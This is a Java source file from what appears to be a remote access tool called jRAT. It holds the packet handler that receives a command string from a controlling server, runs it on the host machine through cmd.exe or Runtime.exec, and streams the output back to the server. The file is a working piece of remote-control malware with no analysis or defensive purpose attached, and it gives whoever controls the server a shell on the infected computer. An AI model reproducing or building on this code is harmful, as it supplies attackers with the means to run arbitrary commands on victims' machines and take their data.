package net.jrat.core.packet.server;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import net.jrat.core.Client;
import net.jrat.core.connection.OS;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C1PacketMessage;
import net.jrat.utils.Variables;

public class S3PacketExecute implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String command;
	
	@Override
	public void execute(Object object) throws Exception
	{
		try
		{
			final Runtime runtime = Runtime.getRuntime();
			
			Process process;
			if(Variables.instance.operatingSystem == OS.WINDOWS)
				process = runtime.exec(new String[] { "cmd.exe", "/c", this.command });
			else
				process = runtime.exec(this.command);
			
			
			new Thread(new Runnable()
			{
				@Override
				public void run()
				{
					while(process.isAlive() && Client.instance.running);
					process.destroy();
				}
			}, "execute").start();
			
			try
			{
				final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
				final StringBuilder builder = new StringBuilder();
				
				String line;
				while(!((line = reader.readLine()) == null) && Client.instance.running)
					builder.append(line).append("\n");
				reader.close();
				
				String command = builder.toString();
				command = command.substring(0, command.length() - 1);
				
				if(Client.instance.running)
					Client.instance.outputStream.writeObject(new C1PacketMessage(command));
			}
			catch (Exception e)
			{
				Client.instance.outputStream.writeObject(new C1PacketMessage("error: " + e.getMessage()));
			}
		}
		catch (Exception e)
		{
			Client.instance.outputStream.writeObject(new C1PacketMessage("error: " + e.getMessage()));
		}
	}
}